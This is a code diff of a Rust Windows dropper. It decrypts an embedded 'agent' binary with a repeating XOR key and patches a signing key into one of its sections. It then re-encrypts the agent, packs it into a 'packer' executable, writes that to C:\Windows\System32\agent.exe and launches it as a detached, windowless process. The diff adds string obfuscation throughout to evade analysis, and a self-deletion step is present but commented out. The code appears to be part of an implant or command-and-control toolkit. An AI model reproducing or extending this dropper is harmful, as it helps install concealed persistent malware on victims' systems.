@@ -1,8 +1,7 @@
 // #![windows_subsystem = "windows"]
-use std::{fs::OpenOptions, os::windows::process::CommandExt, path::Path};
+use std::os::windows::process::CommandExt;
 
 use common::crypto;
-use memmap2::MmapOptions;
 use object::{File, Object, ObjectSection};
 
 const CREATE_NEW_PROCESS_GROUP: u32 = 0x00000200;
@@ -16,21 +15,44 @@ fn get_section(file: &File, name: &str) -> Option<(u64, u64)> {
         .flatten()
 }
 
-fn set_secret_key<P: AsRef<Path>>(
-    path: P,
+fn set_section_data(
+    buf: &mut [u8],
     section_name: &str,
-    secret_key: &[u8; crypto::ED25519_SECRET_KEY_SIZE],
+    data: &[u8],
 ) -> Result<(), Box<dyn std::error::Error>> {
-    let file = OpenOptions::new().read(true).write(true).open(path)?;
-    let mut buf = unsafe { MmapOptions::new().map_mut(&file) }?;
     let file = File::parse(&*buf)?;
-
     if let Some((offset, size)) = get_section(&file, section_name) {
-        assert_eq!(size, crypto::ED25519_SECRET_KEY_SIZE as u64);
+        // assert_eq!(size, N as u64);
+        println!(
+            "Setting section data ({}) at offset: {offset}, size: {size}",
+            data.len()
+        );
         let base = offset as usize;
-        buf[base..(base + crypto::ED25519_SECRET_KEY_SIZE)].copy_from_slice(secret_key);
+        buf[base..(base + data.len())].copy_from_slice(data);
     }
     Ok(())
+}
+
+fn encrypt_data(data: &[u8], key: &[u8]) -> Vec<u8> {
+    let mut encrypted_data = Vec::with_capacity(data.len());
+
+    for (i, &byte) in data.iter().enumerate() {
+        let key_byte = key[i % key.len()];
+        encrypted_data.push(byte ^ key_byte);
+    }
+
+    encrypted_data
+}
+
+fn decrypt_data(data: &[u8], key: &[u8]) -> Vec<u8> {
+    let mut decrypted_data = Vec::with_capacity(data.len());
+
+    for (i, &byte) in data.iter().enumerate() {
+        let key_byte = key[i % key.len()];
+        decrypted_data.push(byte ^ key_byte);
+    }
+
+    decrypted_data
 }
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -40,23 +62,44 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         return;
     }
 
+    let mut agent_bin = decrypt_data(
+        include_bytes!(concat!(env!("OUT_DIR"), "/enc")),
+        obfstr::obfstr!("ABCDEFGHIKLMNOPQRSTVXYZ").as_bytes(),
+    );
+
+    set_section_data(
+        &mut agent_bin,
+        obfstr::obfstr!("secret_key"),
+        crypto::get_signing_key().as_bytes(),
+    )?;
+
+    let encrypted = encrypt_data(
+        &agent_bin,
+        obfstr::obfstr!("ABCDEFGHIKLMNOPQRSTVXYZ").as_bytes(),
+    );
+
     #[cfg(debug_assertions)]
-    let bin = include_bytes!("../../target/x86_64-pc-windows-gnu/debug/agent.exe");
+    let packer_bytes = include_bytes!("../../target/x86_64-pc-windows-gnu/debug/packer.exe");
     #[cfg(not(debug_assertions))]
-    let bin = include_bytes!("../../target/x86_64-pc-windows-gnu/release/agent.exe");
+    let packer_bytes = include_bytes!("../../target/x86_64-pc-windows-gnu/release/packer.exe");
+    let mut packer_bin = packer_bytes.to_vec();
 
-    // let target = "C:\\Windows\\System32\\agent.exe";
-    let target = "agent.exe";
-    let section_name = "secret_key";
+    set_section_data(&mut packer_bin, obfstr::obfstr!("agent"), &encrypted)?;
 
-    std::fs::write(target, bin)?;
-    set_secret_key(target, section_name, crypto::get_signing_key().as_bytes())?;
+    std::fs::write(
+        obfstr::obfstr!("C:\\Windows\\System32\\agent.exe"),
+        packer_bin,
+    )?;
 
     std::process::Command::new("cmd")
         .creation_flags(CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS | CREATE_NO_WINDOW)
-        .args(&["/C", "start", target])
+        .args(&[
+            "/C",
+            "start",
+            obfstr::obfstr!("C:\\Windows\\System32\\agent.exe"),
+        ])
         .spawn()?;
 
-    self_replace::self_delete()?;
+    // self_replace::self_delete()?;
     Ok(())
 }
